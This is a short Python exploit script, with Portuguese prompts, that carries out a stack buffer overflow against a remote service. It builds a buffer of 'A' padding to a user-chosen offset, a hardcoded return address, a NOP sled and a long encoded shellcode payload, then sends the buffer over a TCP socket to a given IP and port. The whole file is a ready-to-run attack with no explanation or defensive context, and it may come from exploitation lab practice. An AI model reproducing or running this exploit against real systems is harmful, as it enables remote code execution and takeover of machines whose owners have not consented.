import sys
import socket

def main():
    if len(sys.argv) < 3:
        print("Uso: python arquivo.py IP PORTA")
        return

    ip = sys.argv[1]
    port = int(sys.argv[2])

    # Solicita o valor para offset
    offset = int(input("Digite o valor para offset: "))

    esp_value = "\xf3\x12\x17\x31"
    shellcode = ("\xbf\xfe\xa6\x9b\x59\xd9\xce\xd9\x74\x24\xf4\x5a\x33\xc9"
"\xb1\x52\x83\xc2\x04\x31\x7a\x0e\x03\x84\xa8\x79\xac\x84"
"\x5d\xff\x4f\x74\x9e\x60\xd9\x91\xaf\xa0\xbd\xd2\x80\x10"
"\xb5\xb6\x2c\xda\x9b\x22\xa6\xae\x33\x45\x0f\x04\x62\x68"
"\x90\x35\x56\xeb\x12\x44\x8b\xcb\x2b\x87\xde\x0a\x6b\xfa"
"\x13\x5e\x24\x70\x81\x4e\x41\xcc\x1a\xe5\x19\xc0\x1a\x1a"
"\xe9\xe3\x0b\x8d\x61\xba\x8b\x2c\xa5\xb6\x85\x36\xaa\xf3"
"\x5c\xcd\x18\x8f\x5e\x07\x51\x70\xcc\x66\x5d\x83\x0c\xaf"
"\x5a\x7c\x7b\xd9\x98\x01\x7c\x1e\xe2\xdd\x09\x84\x44\x95"
"\xaa\x60\x74\x7a\x2c\xe3\x7a\x37\x3a\xab\x9e\xc6\xef\xc0"
"\x9b\x43\x0e\x06\x2a\x17\x35\x82\x76\xc3\x54\x93\xd2\xa2"
"\x69\xc3\xbc\x1b\xcc\x88\x51\x4f\x7d\xd3\x3d\xbc\x4c\xeb"
"\xbd\xaa\xc7\x98\x8f\x75\x7c\x36\xbc\xfe\x5a\xc1\xc3\xd4"
"\x1b\x5d\x3a\xd7\x5b\x74\xf9\x83\x0b\xee\x28\xac\xc7\xee"
"\xd5\x79\x47\xbe\x79\xd2\x28\x6e\x3a\x82\xc0\x64\xb5\xfd"
"\xf1\x87\x1f\x96\x98\x72\xc8\x59\xf4\x4e\x88\x32\x07\xae"
"\x99\x9e\x8e\x48\xf3\x0e\xc7\xc3\x6c\xb6\x42\x9f\x0d\x37"
"\x59\xda\x0e\xb3\x6e\x1b\xc0\x34\x1a\x0f\xb5\xb4\x51\x6d"
"\x10\xca\x4f\x19\xfe\x59\x14\xd9\x89\x41\x83\x8e\xde\xb4"
"\xda\x5a\xf3\xef\x74\x78\x0e\x69\xbe\x38\xd5\x4a\x41\xc1"
"\x98\xf7\x65\xd1\x64\xf7\x21\x85\x38\xae\xff\x73\xff\x18"
"\x4e\x2d\xa9\xf7\x18\xb9\x2c\x34\x9b\xbf\x30\x11\x6d\x5f"
"\x80\xcc\x28\x60\x2d\x99\xbc\x19\x53\x39\x42\xf0\xd7\x59"
"\xa1\xd0\x2d\xf2\x7c\xb1\x8f\x9f\x7e\x6c\xd3\x99\xfc\x84"
"\xac\x5d\x1c\xed\xa9\x1a\x9a\x1e\xc0\x33\x4f\x20\x77\x33"
"\x5a")
                

    buffer = "A" * offset + esp_value + "\x90" * 10 + shellcode

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((ip, port))
            print("[*] Connected")
            s.send(buffer.encode("latin-1"))
    except socket.error as e:
        print("Erro de socket:", str(e))

if __name__ == "__main__":
    main()
